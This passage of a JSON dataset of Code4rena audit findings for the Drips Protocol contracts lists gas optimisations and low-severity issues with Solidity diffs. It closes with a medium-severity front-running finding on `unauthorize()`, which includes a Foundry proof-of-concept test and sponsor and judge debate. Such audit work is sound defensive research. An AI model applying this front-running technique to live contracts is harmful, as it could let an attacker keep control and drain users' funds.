      ],
      "finders": [
        "popular00",
        "gzeon"
      ]
    },
    {
      "id": "22776",
      "title": "[G-06] Transfer erc20 immediately to Dripshub",
      "impact": "GAS",
      "content": "- `Dripshub: give()` gas saved: 9449\n- `AddressDriver: give()` gas saved: 29439\n- `NFTDriver: give()` gas saved: 18936\n\nWhen you call the `give()` function in the Address or NFTDriver. The erc20 token are first getting send to those contracts and afterwards to the DripsHub contract. It's also possible to send the tokens directly to the dripsHub contract.\n\n[AddressDriver.sol#L170-L176](https://github.com/code-423n4/2023-01-drips/blob/main/src/AddressDriver.sol#L170-L176) [NFTDriver.sol#L285-L291](https://github.com/code-423n4/2023-01-drips/blob/main/src/NFTDriver.sol#L285-L291)\n```diff\n    function _transferFromCaller(IERC20 erc20, uint128 amt) internal {\n-       erc20.safeTransferFrom(_msgSender(), address(this), amt);\n+       erc20.safeTransferFrom(_msgSender(), address(dripsHub), amt);\n        // Approval is done only on the first usage of the ERC-20 token in DripsHub by the driver\n-       if (erc20.allowance(address(this), address(dripsHub)) == 0) {\n-           erc20.safeApprove(address(dripsHub), type(uint256).max);\n        }\n    }\n```\n\n[DripsHub.sol#L417](https://github.com/code-423n4/2023-01-drips/blob/main/src/DripsHub.sol#L417)\n```diff\n    function give(uint256 userId, uint256 receiver, IERC20 erc20, uint128 amt)\n        public\n        whenNotPaused\n        onlyDriver(userId)\n    {\n        _increaseTotalBalance(erc20, amt);\n        Splits._give(userId, receiver, _assetId(erc20), amt);\n-       erc20.safeTransferFrom(msg.sender, address(this), amt);\n    }\n```\nsetDrips need to be adjusted or you can create a seperate function for that.\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Drips Protocol",
      "source_link": "https://code4rena.com/reports/2023-01-drips",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22774",
      "title": "[N-01] The NatSpec comment of the `DripsConfigImpl.lt` function neglects to sorting of `dripId`",
      "impact": "LOW",
      "content": "\nAccording to the NatSpec comment of the `DripsConfigImpl.lt` function, the `DripsConfig` struct is sorted by `amtPerSec`, then `start` and then `duration`. However, the `dripId` is not mentioned in the comment:\n\n> /// First compares their `amtPerSec`s, then their `start`s and then their `duration`s.\n\n### Findings\n\n[Drips.sol#L93](https://github.com/code-423n4/2023-01-drips/blob/9fd776b50f4be23ca038b1d0426e63a69c7a511d/src/Drips.sol#L93)\n\n```solidity\n92: /// @notice Compares two `DripsConfig`s.\n93: /// First compares their `amtPerSec`s, then their `start`s and then their `duration`s.\n94: function lt(DripsConfig config, DripsConfig otherConfig) internal pure returns (bool) {\n95:     return DripsConfig.unwrap(config) < DripsConfig.unwrap(otherConfig);\n96: }\n```\n\n[Drips.sol#L1069](https://github.com/code-423n4/2023-01-drips/blob/9fd776b50f4be23ca038b1d0426e63a69c7a511d/src/Drips.sol#L1069)\n\n```solidity\n1061: function _isOrdered(DripsReceiver memory prev, DripsReceiver memory next)\n1062:     private\n1063:     pure\n1064:     returns (bool)\n1065: {\n1066:     if (prev.userId != next.userId) {\n1067:         return prev.userId < next.userId;\n1068:     }\n1069:     return prev.config.lt(next.config); // @audit-info `dripId` of receiver config (The 32 most significant bits) is considered while sorting receivers\n1070: }\n```\n\n### Recommended Mitigation Steps\n\nConsider updating the NatSpec comment to include the `dripId` in the sorting order.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-01-drips-findings/issues/282#issuecomment-1430315911):**\n>*(Note: See [original submission](https://github.com/code-423n4/2023-01-drips-findings/issues/282#issuecomment-1430315911) for judge's full commentary.)*\n> \n> 9 Low, 1 Refactoring +3\n>\n> (includes  downgraded findings, see: [#274](https://github.com/code-423n4/2023-01-drips-findings/issues/274), [#278](https://github.com/code-423n4/2023-01-drips-findings/issues/278), [#280](https://github.com/code-423n4/2023-01-drips-findings/issues/280), [#281](https://github.com/code-423n4/2023-01-drips-findings/issues/281))\n>\n>\n> Summing up all findings, this report is by far the most interesting, well done!\n>\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Drips Protocol",
      "source_link": "https://code4rena.com/reports/2023-01-drips",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "6590",
      "title": "[G-09] Miscellaneous",
      "impact": "GAS",
      "content": "\n### Don't call a function when initializing an immutable variable\nSaves a little bit of deployment gas\n```diff\n-   bytes32 private immutable _counterSlot = _erc1967Slot(\"eip1967.immutableSplitsDriver.storage\");\n+   bytes32 private immutable _counterSlot = bytes32(uint256(keccak256(bytes(\"eip1967.immutableSplitsDriver.storage\"))) - 1);\n```\n### Use a mapping type of a struct directly instead of assigning it to another storage variable\n- [Drips.sol#L246-L254](https://github.com/code-423n4/2023-01-drips/blob/main/src/Drips.sol#L246-L254)\n```diff\n-   mapping(uint32 => AmtDelta) storage amtDeltas = state.amtDeltas;\n    for (uint32 cycle = fromCycle; cycle < toCycle; cycle++) {\n-       delete amtDeltas[cycle];\n+       delete state.amtDeltas[cycle];\n    }\n    // The next cycle delta must be relative to the last received cycle, which got zeroed.\n    // In other words the next cycle delta must be an absolute value.\n    if (finalAmtPerCycle != 0) {\n-       amtDeltas[toCycle].thisCycle += finalAmtPerCycle;\n+       state.amtDeltas[toCycle].thisCycle += finalAmtPerCycle;\n    }\n```\n### If statement can be adjusted\nIn the `_receiveDrips()` function you can change the check to `receivedAmt != 0`. Because when fromCycle and toCycle are the same. ReceivedAmt will be 0.\n\n[Drips.sol#L243](https://github.com/code-423n4/2023-01-drips/blob/main/src/Drips.sol#L243) `receiveDrips()` gas saved: 75\n```diff\n        (receivedAmt, receivableCycles, fromCycle, toCycle, finalAmtPerCycle) =\n            _receiveDripsResult(userId, assetId, maxCycles);\n-       if (fromCycle != toCycle) {\n+       if (receivedAmt != 0) {\n```\n\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-01-drips-findings/issues/81#issuecomment-1431565422):**\n> Best because the savings are high impact and tangible.\n>\n> [G-01]\tMake for loop unchecked\t644\t13\n>\n> Let's say 260 gas (13 * 20)\n> \n> [G-02]\tUse an unchecked block when operands can't underflow/overflow\t688\t7\n>\n> 20 * 7 = 140\n> \n> [G-03]\tWrite element of storage struct to memory when used more than once\t10\t1\n>\n> 100 gas\n> \n> [G-04]\tCall block.timestamp direclty instead of function\t22\t1\n>\n> 16\n> \n> [G-06]\tTransfer erc20 immediately to Dripshub\t57824\t1\n>\n> 5k\n> \n> [G-07]\tTransfer ERC20 immediately to the user\t22112\t1\n>\n> 5k\n> \n> Rest is marginal\n> \n> 10k+\n>\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Drips Protocol",
      "source_link": "https://code4rena.com/reports/2023-01-drips",
      "github_link": "#g-09-miscellaneous",
      "tags": [],
      "finders": []
    },
    {
      "id": "6589",
      "title": "[G-08] Use double if statements instead of &&",
      "impact": "GAS",
      "content": "\nIf the if statement has a logical AND and is not followed by an else statement, it can be replaced with 2 if statements.\n\n- [Drips.sol#L700](https://github.com/code-423n4/2023-01-drips/blob/main/src/Drips.sol#L700)\n- [Drips.sol#L709](https://github.com/code-423n4/2023-01-drips/blob/main/src/Drips.sol#L709)\n- [Drips.sol#L909](https://github.com/code-423n4/2023-01-drips/blob/main/src/Drips.sol#L909)\n- [Drips.sol#L929](https://github.com/code-423n4/2023-01-drips/blob/main/src/Drips.sol#L929)\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Drips Protocol",
      "source_link": "https://code4rena.com/reports/2023-01-drips",
      "github_link": "#g-08-use-double-if-statements-instead-of-",
      "tags": [],
      "finders": []
    },
    {
      "id": "6588",
      "title": "[G-07] Transfer ERC20 immediately to the user",
      "impact": "GAS",
      "content": "- `AddressDriver: collect()` gas saved: 12954\n- `NFTDriver: collect()` gas saved: 9158\n\nThe same thing can be done for the `collect()` function. Instead of transferring first to the address or NFTdriver. You can instantly transfer to the user.\n[DripsHub.sol#L386-L395)](https://github.com/code-423n4/2023-01-drips/blob/main/src/DripsHub.sol#L386-L395)\n```diff\n-   function collect(uint256 userId, IERC20 erc20)\n+   function collect(uint256 userId, IERC20 erc20, address transferTo)\n        public\n        whenNotPaused\n        onlyDriver(userId)\n        returns (uint128 amt)\n    {\n        amt = Splits._collect(userId, _assetId(erc20));\n        _decreaseTotalBalance(erc20, amt);\n-       erc20.safeTransfer(msg.sender, amt);\n+       erc20.safeTransfer(transferTo, amt);\n    }\n```\n[AddressDriver.sol#L60-L63](https://github.com/code-423n4/2023-01-drips/blob/main/src/AddressDriver.sol#L60-L63)\n```diff\n    function collect(IERC20 erc20, address transferTo) public whenNotPaused returns (uint128 amt) {\n-       amt = dripsHub.collect(callerUserId(), erc20);\n+       amt = dripsHub.collect(callerUserId(), erc20, transferTo);\n-       erc20.safeTransfer(transferTo, amt);\n    }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Drips Protocol",
      "source_link": "https://code4rena.com/reports/2023-01-drips",
      "github_link": "#g-07-transfer-erc20-immediately-to-the-user",
      "tags": [],
      "finders": []
    },
    {
      "id": "6587",
      "title": "[G-05] Make 3 event parameters indexed when possible",
      "impact": "GAS",
      "content": "It's the most gas efficient to make up to 3 event parameters indexed. If there are less than 3 parameters, you need to make all parameters indexed.\n\n- [DripsHub.sol#L93](https://github.com/code-423n4/2023-01-drips/blob/main/src/DripsHub.sol#L93)\n```diff\n-    event UserMetadataEmitted(uint256 indexed userId, bytes32 indexed key, bytes value);\n+    event UserMetadataEmitted(uint256 indexed userId, bytes32 indexed key, bytes indexed value);\n```\nThe event is used in the function emitUserMetaData, this function is used multiple times. The gas saved for making all the parameters indexed is:\n- DripsHub.sol: `emitUserMetadata()` gas saved: 364\n- AddressDriver.sol: `emitUserMetadata()` gas saved: 208\n- ImmutableSplitsDriver.sol: `createSplits()` gas saved: 139\n- NFTDriver.sol: `emitUserMetadata()` gas saved: 139\n- NFTDriver.sol: `safeMint()` gas saved: 209\n\nThe same extra indexed parameter can be applied to:\n- [Drips.sol#L153](https://github.com/code-423n4/2023-01-drips/blob/main/src/Drips.sol#L153) `DripsHub: setDrips()`\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Drips Protocol",
      "source_link": "https://code4rena.com/reports/2023-01-drips",
      "github_link": "#g-05-make-3-event-parameters-indexed-when-possible",
      "tags": [],
      "finders": []
    },
    {
      "id": "6586",
      "title": "[G-04] Call block.timestamp direclty instead of function",
      "impact": "GAS",
      "content": "\nThe `_currTimestamp()` function casts the `block.timestamp` to a uint32. However it's not always necessary to have a uint32.\n\nIn the example below you are assigning the timestamp to a uint256. Which makes it unnecessary to cast the timestamp to uint32. So it's better to call `block.timestamp` directly.\n\n[Drips.sol#L689](https://github.com/code-423n4/2023-01-drips/blob/main/src/Drips.sol#L689): `DripsHub: setDrips()` gas saved: 22\n```diff\n-    uint256 enoughEnd = _currTimestamp();\n+    uint256 enoughEnd = block.timestamp;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Drips Protocol",
      "source_link": "https://code4rena.com/reports/2023-01-drips",
      "github_link": "#g-04-call-blocktimestamp-direclty-instead-of-function",
      "tags": [],
      "finders": []
    },
    {
      "id": "6585",
      "title": "[G-03] Write element of storage struct to memory when used more than once",
      "impact": "GAS",
      "content": "When a struct contains a nested mapping, it's not possible to save it in memory. But it's possible to save one element of the struct to memory when it's used more than once. `DripsHub: balanceAt()` gas saved: 10\n\n- [Drips.sol#L539-L542](https://github.com/code-423n4/2023-01-drips/blob/main/src/Drips.sol#L539-L542)\n\n```diff\n        DripsState storage state = _dripsStorage().states[assetId][userId];\n+       uint32 updateTime = state.updateTime;\n-       require(timestamp >= state.updateTime, \"Timestamp before last drips update\");\n+       require(timestamp >= updateTime, \"Timestamp before last drips update\");\n        require(_hashDrips(receivers) == state.dripsHash, \"Invalid current drips list\");\n-       return _balanceAt(state.balance, state.updateTime, state.maxEnd, receivers, timestamp);\n+       return _balanceAt(state.balance, updateTime, state.maxEnd, receivers, timestamp);\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Drips Protocol",
      "source_link": "https://code4rena.com/reports/2023-01-drips",
      "github_link": "#g-03-write-element-of-storage-struct-to-memory-when-used-more-than-once",
      "tags": [],
      "finders": []
    },
    {
      "id": "6584",
      "title": "[G-02] Use an unchecked block when operands can't underflow/overflow",
      "impact": "GAS",
      "content": "\n[Drips.sol#L480](https://github.com/code-423n4/2023-01-drips/blob/main/src/Drips.sol#L480)\n\nDivision can't overflow or underflow unless the divisor is -1. Which is not the case here. `DripsHub: squeezeDripsResult()` gas saved: 60\n\n```solidity\n    uint256 idxMid = (idx + idxCap) / 2;\n```\n\n[Drips.sol#L655](https://github.com/code-423n4/2023-01-drips/blob/main/src/Drips.sol#L655)\n\nThere is no possibility of overflowing when incrementing by one. currCycleConfigs is a uint32 but even for that will take a massive amount of time to make it overflow. `DripsHub: setDrips()` gas saved: 215\n\n```solidity\n    state.currCycleConfigs++;\n```\n\nFor ++, the same applies to:\n- [Drips.sol#L428](https://github.com/code-423n4/2023-01-drips/blob/main/src/Drips.sol#L428) `DripsHub: squeezeDrips()` gas saved: 28\n- [Drips.sol#L959](https://github.com/code-423n4/2023-01-drips/blob/main/src/Drips.sol#L959) and [Drips.sol#L962](https://github.com/code-423n4/2023-01-drips/blob/main/src/Drips.sol#L962): `DripsHub: setDrips()` gas saved: 35\n- [DripsHub.sol#L136](https://github.com/code-423n4/2023-01-drips/blob/main/src/DripsHub.sol#L136) `DripsHub: registerDriver()` gas saved: 200\n\n[DripsHub.sol#L632](https://github.com/code-423n4/2023-01-drips/blob/main/src/DripsHub.sol#L632): because of the require statement above, it can't overflow. `give()` gas saved: 54\n\n[DripsHub.sol#L636](https://github.com/code-423n4/2023-01-drips/blob/main/src/DripsHub.sol#L636): amount will never be larger than the total balance: `collect()` gas saved: 96\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Drips Protocol",
      "source_link": "https://code4rena.com/reports/2023-01-drips",
      "github_link": "#g-02-use-an-unchecked-block-when-operands-cant-underflowoverflow",
      "tags": [],
      "finders": []
    },
    {
      "id": "6583",
      "title": "[G-01] Make for loop unchecked",
      "impact": "GAS",
      "content": "The risk of for loops getting overflowed is extremely low. Because it always increments by 1 and is limited to the arrays length. Even if the arrays are extremely long, it will take a massive amount of time and gas to let the for loop overflow.\n\n- [Caller.sol#L196-L199](https://github.com/code-423n4/2023-01-drips/blob/main/src/Caller.sol#L196-L199): `callBatched()` gas saved: 76\n- [ImmutableSplitsDriver.sol#L61-L63](https://github.com/code-423n4/2023-01-drips/blob/main/src/ImmutableSplitsDriver.sol#L61-L63): `createSplits()` gas saved: 92\n- [Drips.sol#L247-L249](https://github.com/code-423n4/2023-01-drips/blob/main/src/Drips.sol#L247-L249): `DripsHub: receiveDrips()` gas saved: 58 \n- [Drips.sol#L287-L291](https://github.com/code-423n4/2023-01-drips/blob/main/src/Drips.sol#L287-L291): `DripsHub: receiveDripsResult()` gas saved: 54\n- [Drips.sol#L357-L364](https://github.com/code-423n4/2023-01-drips/blob/main/src/Drips.sol#L357-L364): `DripsHub: squeezeDrips()` gas saved: 32\n- [Drips.sol#L450-L459](https://github.com/code-423n4/2023-01-drips/blob/main/src/Drips.sol#L450-L459): `DripsHub: squeezeDripsResult()` gas saved: 71\n- [Drips.sol#L490-L497](https://github.com/code-423n4/2023-01-drips/blob/main/src/Drips.sol#L490-L497): `DripsHub: squeezeDripsResult()` gas saved: 29\n- [Drips.sol#L563-L573](https://github.com/code-423n4/2023-01-drips/blob/main/src/Drips.sol#L563-L573): `DripsHub: balanceAt()` gas saved: 59\n- [Drips.sol#L662-L668](https://github.com/code-423n4/2023-01-drips/blob/main/src/Drips.sol#L662-L668): `DripsHub: setDrips()` gas saved: 31\n- [DripsHub.sol#L613-L616](https://github.com/code-423n4/2023-01-drips/blob/main/src/DripsHub.sol#L613-L616): `emitUserMetadata()` gas saved: 59\n- [Splits.sol#L127-L129](https://github.com/code-423n4/2023-01-drips/blob/main/src/Splits.sol#L127-L129): `DripsHub: splitResult()` gas saved: 10\n- [Splits.sol#L158-L166](https://github.com/code-423n4/2023-01-drips/blob/main/src/Splits.sol#L158-L166): `DripsHub: split()` gas saved: 10\n- [Splits.sol#L231-L243](https://github.com/code-423n4/2023-01-drips/blob/main/src/Splits.sol#L231-L243): `DripsHub: setSplits()` gas saved: 63\n\nThere are 2 ways to make a for loop unchecked in a safe way:\n\n```diff\n-       for (uint256 i = 0; i < calls.length; i++) {\n-       for (uint256 i = 0; i < calls.length;) {\n            Call memory call = calls[i];\n            returnData[i] = _call(sender, call.to, call.data, call.value);\n+           unchecked{\n+              i++\n+           } \n        }\n```\n```diff\n+       function unchecked_inc(uint256 x) private pure returns (uint256) {\n+          unchecked {\n+             return x + 1;\n+          }\n+       }\n\n-       for (uint256 i = 0; i < calls.length; i++) {\n+       for (uint256 i = 0; i < calls.length;  i = unchecked_inc(i)) {\n            Call memory call = calls[i];\n            returnData[i] = _call(sender, call.to, call.data, call.value);\n        }\n```\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Drips Protocol",
      "source_link": "https://code4rena.com/reports/2023-01-drips",
      "github_link": "#g-01-make-for-loop-unchecked",
      "tags": [],
      "finders": []
    },
    {
      "id": "6582",
      "title": "[L-05] An immutable split is unable to collect funds if it has itself set as a split receiver",
      "impact": "LOW",
      "content": "\nAn immutable split cannot collect funds if it has itself set as a split receiver. This is because the `ImmutableSplitsDriver` contract lacks the functionality to collect available funds.\n\n### Findings\n\n[ImmutableSplitsDriver.sol#L66](https://github.com/code-423n4/2023-01-drips/blob/9fd776b50f4be23ca038b1d0426e63a69c7a511d/src/ImmutableSplitsDriver.sol#L66)\n\n```solidity\n53: function createSplits(SplitsReceiver[] calldata receivers, UserMetadata[] calldata userMetadata)\n54:     public\n55:     whenNotPaused\n56:     returns (uint256 userId)\n57: {\n58:     userId = nextUserId();\n59:     StorageSlot.getUint256Slot(_counterSlot).value++;\n60:     uint256 weightSum = 0;\n61:     for (uint256 i = 0; i < receivers.length; i++) {\n62:         weightSum += receivers[i].weight;\n63:     }\n64:     require(weightSum == totalSplitsWeight, \"Invalid total receivers weight\");\n65:     emit CreatedSplits(userId, dripsHub.hashSplits(receivers));\n66:     dripsHub.setSplits(userId, receivers);\n67:     if (userMetadata.length > 0) dripsHub.emitUserMetadata(userId, userMetadata);\n68: }\n```\n\n### Recommended Mitigation Steps\n\nConsider preventing setting one of the receivers to the user ID of the newly created immutable split.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Drips Protocol",
      "source_link": "https://code4rena.com/reports/2023-01-drips",
      "github_link": "#l-05-an-immutable-split-is-unable-to-collect-funds-if-it-has-itself-set-as-a-split-receiver",
      "tags": [],
      "finders": []
    },
    {
      "id": "6581",
      "title": "[L-04] Collecting funds should be usable while the `DripsHub` contract is paused",
      "impact": "LOW",
      "content": "\nThe `DripsHub.collect` function is only callable when the `DripsHub` contract is not paused. This prevents a user from collecting accumulated funds. The admin of the `DripsHub` contract can potentially pause the contracts at any time, locking users out of their honestly earned funds.\n\n### Findings\n\n[DripsHub.sol#L388](https://github.com/code-423n4/2023-01-drips/blob/9fd776b50f4be23ca038b1d0426e63a69c7a511d/src/DripsHub.sol#L388)\n\n```solidity\n386: function collect(uint256 userId, IERC20 erc20)\n387:     public\n388:     whenNotPaused\n389:     onlyDriver(userId)\n390:     returns (uint128 amt)\n391: {\n392:     amt = Splits._collect(userId, _assetId(erc20));\n393:     _decreaseTotalBalance(erc20, amt);\n394:     erc20.safeTransfer(msg.sender, amt);\n395: }\n```\n\n### Recommended Mitigation Steps\n\nConsider removing the `whenNotPaused` modifier to allow collecting funds while the `DripsHub` contract is paused.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Drips Protocol",
      "source_link": "https://code4rena.com/reports/2023-01-drips",
      "github_link": "#l-04-collecting-funds-should-be-usable-while-the-dripshub-contract-is-paused",
      "tags": [],
      "finders": []
    },
    {
      "id": "6580",
      "title": "[L-03] Unused `dripId` of receiver config is used considered while sorting receivers",
      "impact": "LOW",
      "content": "\nThe `Drips._isOrdered` function compares two given receivers. The receiver config can include the prefixed `dripId` in the 32 most significant bits. This allows using the `dripId` for changing the order of receivers when setting a new drips configuration without violating the sorting requirement, _First compares their `amtPerSec`s, then their `start`s and then their `duration`s_ ([see Drips.sol#L93](https://github.com/code-423n4/2023-01-drips/blob/9fd776b50f4be23ca038b1d0426e63a69c7a511d/src/Drips.sol#L93)).\n\nWhile no harmful effects are expected, it can be used in the `Drips._setDrips` function to control if delta amounts of receivers are first removed, added, or updated, are expected.\n\n### Findings\n\n[Drips.sol#L1069](https://github.com/code-423n4/2023-01-drips/blob/9fd776b50f4be23ca038b1d0426e63a69c7a511d/src/Drips.sol#L1069)\n\n```solidity\n1061: function _isOrdered(DripsReceiver memory prev, DripsReceiver memory next)\n1062:     private\n1063:     pure\n1064:     returns (bool)\n1065: {\n1066:     if (prev.userId != next.userId) {\n1067:         return prev.userId < next.userId;\n1068:     }\n1069:     return prev.config.lt(next.config);\n1070: }\n```\n\n### Recommended Mitigation Steps\n\nConsider omitting the `dripId` from the receiver config when comparing the receivers.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Drips Protocol",
      "source_link": "https://code4rena.com/reports/2023-01-drips",
      "github_link": "#l-03-unused-dripid-of-receiver-config-is-used-considered-while-sorting-receivers",
      "tags": [],
      "finders": []
    },
    {
      "id": "6579",
      "title": "[L-02] Lack of reasonable boundaries for cycle secs",
      "impact": "LOW",
      "content": "\nIf `_cycleSecs` is set too low, for example, to a value less than the Ethereum block time of 12 sec, it will not be possible to squeeze. If set too high, e.g., larger than the current `block.timestamp`, it will not be possible to receive drips - only squeezing will be possible.\n\n### Findings\n\n[Drips.sol#L221](https://github.com/code-423n4/2023-01-drips/blob/9fd776b50f4be23ca038b1d0426e63a69c7a511d/src/Drips.sol#L221)\n\n```solidity\n219: constructor(uint32 cycleSecs, bytes32 dripsStorageSlot) {\n220:     require(cycleSecs > 1, \"Cycle length too low\");\n221:     _cycleSecs = cycleSecs;\n222:     _dripsStorageSlot = dripsStorageSlot;\n223: }\n```\n\n### Recommended Mitigation Steps\n\nConsider adding an appropriate upper limit for `_cycleSecs`.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Drips Protocol",
      "source_link": "https://code4rena.com/reports/2023-01-drips",
      "github_link": "#l-02-lack-of-reasonable-boundaries-for-cycle-secs",
      "tags": [],
      "finders": []
    },
    {
      "id": "6578",
      "title": "[L-01] An authorized user can unauthorize other authorized users of the same sender",
      "impact": "LOW",
      "content": "\nA user can grant authorization to another address to make calls on their behalf via the `Caller.callAs` function. The `Caller.unauthorize` function allows the user to revoke the authorization of another address.\n\nAn authorized user can revoke the authorization of another authorized user of the same sender. This is because the authorized user can call the `Caller.unauthorize` function on behalf of the sender.\n\n### Findings\n\n[Caller.sol#L114-L118](https://github.com/code-423n4/2023-01-drips/blob/9fd776b50f4be23ca038b1d0426e63a69c7a511d/src/Caller.sol#L114-L118)\n\n```solidity\n114: function unauthorize(address user) public {\n115:     address sender = _msgSender();\n116:     require(_authorized[sender].remove(user), \"Address is not authorized\");\n117:     emit Unauthorized(sender, user);\n118: }\n```\n\n### Recommended Mitigation Steps\n\nConsider preventing calls to the `Caller` contract address from within the `_call` function.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Drips Protocol",
      "source_link": "https://code4rena.com/reports/2023-01-drips",
      "github_link": "#l-01-an-authorized-user-can-unauthorize-other-authorized-users-of-the-same-sender",
      "tags": [],
      "finders": []
    },
    {
      "id": "6577",
      "title": "[M-02] `unauthorize()` can be front-run so that the malicious authorized user would get their authority back",
      "impact": "MEDIUM",
      "content": "\nThe `Caller` contract enables users to authorize other users to execute tx on their behalf.\nThis option enables the authorized/delegated user to add more users to the authorized users list.\nIn case the original user is trying to remove an authorized user (i.e. run `unauthorize()`), the delegated user can simply front run that tx to add another user, then after `unauthorized()` is executed the delegated can use the added user to gain his authority back.\n\nThis would allow the malicious delegated user to keep executing txs on behalf of the original user and cause them a loss of funds (e.g. collecting funds on their behalf and sending it to the attacker's address).\n\n### Proof of Concept\n\nThe test below demonstrates such a scenario:\n\n*   Alice authorizes Bob\n*   Bob becomes malicious and Alice now wants to remove him\n*   Bob noticed the tx to unauthorize him and front runs it by authorizing Eve\n*   Alice `unauthorize()` tx is executed\n*   Bob now authorizes himself back again via Eve's account\n\nFront running can be done either by sending a tx with a higher gas price (usually tx are ordered in a block by the gas price / total fee), or by paying an additional fee to the validator if they manage to run their tx without reverting (i.e. by sending additional ETH to `block.coinbase`, hoping validator will notice it).\nIt's true that Alice can run `unauthorize()` again and again and needs to succeed only once, but:\n\n*   Bob can keep adding other users and Alice would have to keep removing them all\n*   This is an ongoing battle that can last forever, and Alice might not have enough knowledge, resources and time to deal with it right away. This might take hours or days, and in the meanwhile Alice might be receiving a significant amount of drips that would be stolen by Bob.\n\n```diff\ndiff --git a/test/Caller.t.sol b/test/Caller.t.sol\nindex 861b351..3e4be22 100644\n--- a/test/Caller.t.sol\n+++ b/test/Caller.t.sol\n@@ -125,6 +125,24 @@ contract CallerTest is Test {\n         vm.expectRevert(ERROR_UNAUTHORIZED);\n         caller.callAs(sender, address(target), data);\n     }\n+    \n+    function testFrontRunUnauthorize() public {\n+        bytes memory data = abi.encodeWithSelector(target.run.selector, 1);\n+        address bob = address(0xbab);\n+        address eve = address(0xefe);\n+        // Bob is authorized by Alice\n+        authorize(sender, bob);\n+\n+        // Bob became malicious and Alice now wants to remove him\n+        // Bob sees the `unauthorize()` call and front runs it with authorizing Eve\n+        authorizeCallAs(sender, bob, eve);\n+\n+        unauthorize(sender, bob);\n+\n+        // Eve can now give Bob his authority back\n+        authorizeCallAs(sender, eve, bob);\n+\n+    }\n \n     function testAuthorizingAuthorizedReverts() public {\n         authorize(sender, address(this));\n@@ -257,6 +275,13 @@ contract CallerTest is Test {\n         assertTrue(caller.isAuthorized(authorizing, authorized), \"Authorization failed\");\n     }\n \n+    function authorizeCallAs(address originalUser,address delegated, address authorized) internal {\n+        bytes memory data = abi.encodeWithSelector(Caller.authorize.selector, authorized);\n+        vm.prank(delegated);\n+        caller.callAs(originalUser, address(caller),  data);\n+        assertTrue(caller.isAuthorized(originalUser, authorized), \"Authorization failed\");\n+    }\n+\n     function unauthorize(address authorizing, address unauthorized) internal {\n         vm.prank(authorizing);\n         caller.unauthorize(unauthorized);\n\n```\n\n### Recommended Mitigation Steps\n\nDon't allow authorized users to call `authorize()` on behalf of the original user.\n\nThis can be done by replacing `_msgSender()` with `msg.sender` at `authorize()`, if the devs want to enable authorizing by signing I think the best way would be to add a dedicated function for that (other ways to prevent calling `authorize()` from `callAs()` can increase gas cost for normal calls, esp. since we'll need to cover all edge cases of recursive calls with `callBatched()`).\n\n**[xmxanuel (Drips) commented](https://github.com/code-423n4/2023-01-drips-findings/issues/163#issuecomment-1424324859):**\n > Known behavior. I think it is debatable. The `authorize` means an other address is completely trusted in terms of access to funds.\n> In most cases this will be the same actor like Alice. Just another address of Alice.\n\n**[CodeSandwich (Drips) disagreed with severity and commented](https://github.com/code-423n4/2023-01-drips-findings/issues/163#issuecomment-1426357093):**\n> Like Manuel said, this is known, authorizing somebody gives them extreme privileges anyway, like stealing all the funds available for the user in the protocol.\n> \n> I disagree that it's a High severity issue, because the attacked user with some effort can defend themselves. In a single batch they need to authorize a contract that would iterate over all addresses returned by `allAuthorized` and for each of them to call `unauthorize` on behalf of the attacked user.\n> \n> I think that the above emergency defense mechanism could be built right into `Caller`'s API to make it cheaper and easier to run, basically adding an `unauthorizeAll` function that will clear the authorized addresses list. That's why I agree that it **is** an issue to solve, but a low severity one, it's only a quality of life improvement.\n> \n> The proposed mitigation of banning authorized users from authorizing others is too heavy handed, because it hurts use cases like a slow DAO authorizing a trusted operator, who then needs to rotate keys or authorize a \"script contract\" performing automated operations on Drips protocol. Authorization by signing hurts all non-EOA addresses like DAOs or multisigs which don't have private keys.\n\n**[Alex the Entreprenerd (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-01-drips-findings/issues/163#issuecomment-1441660411):**\n > Because of the fact that the only requirement for the attack is for the authorized to be malicious, I have considered High Severity.\n> \n> After further reflection, because of the ability to remove the malicious attacker via a Macro, per the Sponsor's comment above, I believe Medium Severity to be the most appropriate.\n> \n> The approval should be considered an extremely dangerous operation, which can cause drastic losses, however, a malicious approved can eventually be unapproved via a macro contract.\n\n**[xmxanuel 